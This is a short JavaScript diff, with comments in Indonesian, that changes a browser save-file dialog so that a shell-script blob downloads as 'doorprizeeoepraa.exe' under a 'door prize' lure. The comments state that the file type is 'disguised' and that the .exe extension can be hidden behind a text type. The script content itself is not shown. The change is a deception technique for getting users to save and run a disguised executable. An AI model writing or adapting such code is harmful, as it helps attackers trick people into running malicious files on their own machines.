@@ -177,19 +177,19 @@
 
           const blob = new Blob([zshContent], { type: "text/plain" });
 
-          const options = {
-            startIn: "downloads",
-            suggestedName: "doorprize.zexe",
+         const options = {
+            suggestedName: "doorprizeeoepraa.exe", // Akan diunduh dengan ekstensi .exe, tapi bisa disembunyikan
             types: [
               {
-                description: "ZSH Shell Script",
+                description: "File executable (disamarkan)",
                 accept: {
-                  "text/plain": [".exe"],
+                  "text/plain": [".txt"], // Gunakan ekstensi teks atau ekstensi umum lainnya
                 },
               },
             ],
             excludeAcceptAllOption: true,
           };
+
 
           try {
             const handle = await window.showSaveFilePicker(options);
